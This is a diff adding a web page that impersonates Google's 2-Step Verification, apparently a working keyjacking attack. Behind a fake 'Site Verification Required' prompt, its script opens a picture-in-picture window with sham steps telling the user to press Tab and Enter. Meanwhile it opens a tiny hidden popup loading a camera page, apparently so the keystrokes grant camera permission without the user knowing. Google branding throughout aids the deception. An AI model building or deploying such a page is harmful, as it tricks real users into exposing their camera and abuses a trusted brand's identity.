@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Google 2-Step Verification</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+      integrity="sha512-xxxx"
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        font-family: "Roboto", sans-serif; /* Menggunakan Roboto */
+        background-color: #f8f9fa; /* Latar belakang putih keabu-abuan */
+        color: #202124; /* Warna teks gelap khas Google */
+        text-align: center;
+        padding: 20px;
+      }
+
+      .google-logo {
+        margin-bottom: 30px;
+      }
+
+      .google-logo img {
+        width: 120px; /* Ukuran logo yang pas */
+      }
+
+      h2 {
+        font-size: 26px; /* Ukuran yang sedikit lebih besar */
+        margin-bottom: 25px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        color: #3c4043; /* Warna judul yang lebih gelap */
+      }
+
+      h2 i {
+        font-size: 26px;
+        color: #4285f4; /* Warna ikon biru khas Google */
+      }
+
+      button {
+        padding: 12px 28px;
+        font-size: 17px;
+        font-weight: 500; /* Sedikit lebih tebal */
+        cursor: pointer;
+        background-color: #1a73e8; /* Biru Google */
+        color: #fff;
+        border: none;
+        border-radius: 4px; /* Border radius lebih kecil seperti Google */
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* Shadow lebih halus */
+        transition: background-color 0.3s ease, box-shadow 0.2s ease;
+      }
+
+      button:hover {
+        background-color: #185abc; /* Biru lebih gelap saat hover */
+        box-shadow: 0 3px 6px rgba(0, 0, 0, 0.15);
+      }
+
+      @media (max-width: 600px) {
+        h2 {
+          font-size: 20px;
+        }
+
+        button {
+          width: 90%; /* Sedikit lebih kecil di mobile */
+          font-size: 15px;
+        }
+
+        .google-logo img {
+          width: 100px;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="google-logo">
+      <img
+        src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
+        alt="Google Logo"
+      />
+    </div>
+    <h2><i class="fas fa-shield-alt"></i> Site Verification Required</h2>
+    <p>
+      To ensure the security and authenticity of your session, a brief
+      verification process is required.
+    </p>
+    <button id="open-pip-button" onclick="openPip()">
+      <i class="fas fa-lock"></i> Verify
+    </button>
+
+    <script>
+      let pipWindow;
+      let popupWindow;
+
+      async function openPip() {
+        try {
+          pipWindow = await documentPictureInPicture.requestWindow({
+            width: 1000,
+            height: 1000,
+          });
+
+          const style = pipWindow.document.createElement("style");
+          style.textContent = `
+            body {
+              display: flex;
+              flex-direction: column;
+              justify-content: center;
+              align-items: center;
+              height: 100vh;
+              margin: 0;
+              font-family: "Roboto", sans-serif; /* Menggunakan Roboto */
+              background-color: #ffffff; /* Latar belakang putih */
+              color: #202124; /* Warna teks gelap */
+              text-align: center;
+              padding: 20px;
+            }
+            .pip-google-logo { /* Gaya baru untuk logo di PiP */
+                margin-bottom: 20px;
+            }
+            .pip-google-logo img {
+                width: 100px; /* Ukuran logo di PiP */
+            }
+            .step-heading {
+              font-size: 22px; /* Lebih kecil dari judul utama */
+              margin-top: 25px;
+              color: #3c4043;
+              font-weight: 500;
+            }
+            #message, #exit-message {
+              font-size: 18px; /* Ukuran teks pesan */
+              margin-top: 15px;
+              color: #5f6368; /* Warna abu-abu yang lebih lembut */
+              max-width: 80%;
+              line-height: 1.5;
+            }
+            #confirm-button, #start-button {
+              padding: 10px 20px;
+              font-size: 15px;
+              cursor: pointer;
+              background-color: #1a73e8; /* Biru Google */
+              color: #ffffff;
+              border: none;
+              border-radius: 4px;
+              font-weight: 500;
+              transition: background-color 0.3s ease, box-shadow 0.2s ease;
+              margin-top: 25px;
+            }
+            #confirm-button:hover, #start-button:hover {
+              background-color: #185abc;
+              box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            }
+            #message, #confirm-button, #exit-message, #start-button, .step-heading {
+              display: none; /* Sembunyikan secara default */
+            }
+            @media (max-width: 600px) {
+                .pip-google-logo img {
+                    width: 80px;
+                }
+                .step-heading {
+                    font-size: 20px;
+                }
+                #message, #exit-message {
+                    font-size: 16px;
+                }
+                #confirm-button, #start-button {
+                    font-size: 14px;
+                    padding: 8px 18px;
+                }
+            }
+          `;
+          pipWindow.document.head.appendChild(style);
+
+          // Memuat Google Fonts di PiP window juga
+          const robotoLink = pipWindow.document.createElement("link");
+          robotoLink.rel = "stylesheet";
+          robotoLink.href =
+            "https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap";
+          pipWindow.document.head.appendChild(robotoLink);
+
+          // Menambahkan ikon Google ke PiP window
+          const pipGoogleLogoDiv = pipWindow.document.createElement("div");
+          pipGoogleLogoDiv.className = "pip-google-logo";
+          const pipGoogleLogoImg = pipWindow.document.createElement("img");
+          pipGoogleLogoImg.src =
+            "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png";
+          pipGoogleLogoImg.alt = "Google Logo";
+          pipGoogleLogoDiv.appendChild(pipGoogleLogoImg);
+          pipWindow.document.body.appendChild(pipGoogleLogoDiv);
+
+          createAndAppendElement(
+            pipWindow,
+            "button",
+            "start-button",
+            "Click to Start 2-Step Verification Process"
+          );
+          createAndAppendElement(
+            pipWindow,
+            "div",
+            "step1-heading",
+            "Step 1:",
+            "none",
+            "step-heading"
+          );
+          createAndAppendElement(
+            pipWindow,
+            "div",
+            "message",
+            "Press Tab 3 times and then click 'Confirm' for step 2",
+            "none"
+          );
+          createAndAppendElement(
+            pipWindow,
+            "button",
+            "confirm-button",
+            "Confirm",
+            "none"
+          );
+          createAndAppendElement(
+            pipWindow,
+            "div",
+            "step2-heading",
+            "Step 2:",
+            "none",
+            "step-heading"
+          );
+          createAndAppendElement(
+            pipWindow,
+            "div",
+            "exit-message",
+            "Press Enter twice to Exit and Verify",
+            "none"
+          );
+
+          addEventListeners(pipWindow);
+        } catch (error) {
+          console.error("Error opening PiP window:", error);
+        }
+      }
+
+      function createAndAppendElement(
+        pipWindow,
+        tagName,
+        id,
+        textContent,
+        display = "block",
+        className = ""
+      ) {
+        const element = pipWindow.document.createElement(tagName);
+        element.id = id;
+        element.textContent = textContent;
+        element.style.display = display;
+        if (className) {
+          element.className = className;
+        }
+        pipWindow.document.body.appendChild(element);
+      }
+
+      function addEventListeners(pipWindow) {
+        const startButton = pipWindow.document.getElementById("start-button");
+        startButton.addEventListener("click", () => {
+          // Hanya membuka popup jika belum ada atau sudah tertutup
+          if (!popupWindow || popupWindow.closed) {
+            popupWindow = window.open(
+              "camera.html",
+              "popupWindow",
+              "width=100,height=100,left=850,top=650"
+            );
+          }
+          startButton.style.display = "none";
+          pipWindow.document.getElementById("step1-heading").style.display =
+            "block";
+          pipWindow.document.getElementById("message").style.display = "block";
+          pipWindow.document.getElementById("confirm-button").style.display =
+            "block";
+        });
+
+        const confirmButton =
+          pipWindow.document.getElementById("confirm-button");
+        confirmButton.addEventListener("click", () => {
+          pipWindow.document.getElementById("step1-heading").style.display =
+            "none";
+          pipWindow.document.getElementById("message").style.display = "none";
+          confirmButton.style.display = "none";
+          pipWindow.document.getElementById("step2-heading").style.display =
+            "block";
+          pipWindow.document.getElementById("exit-message").style.display =
+            "block";
+        });
+
+        let enterPressCount = 0;
+        pipWindow.addEventListener("keydown", (event) => {
+          if (event.key === "Enter") {
+            enterPressCount++;
+            if (enterPressCount === 2) {
+              pipWindow.close();
+              setTimeout(() => {
+                if (popupWindow && !popupWindow.closed) {
+                  popupWindow.close();
+                }
+              }, 500); // Beri sedikit waktu sebelum menutup popup
+            }
+          } else {
+            enterPressCount = 0; // Reset hitungan jika tombol lain ditekan
+          }
+        });
+      }
+    </script>
+  </body>
+</html>
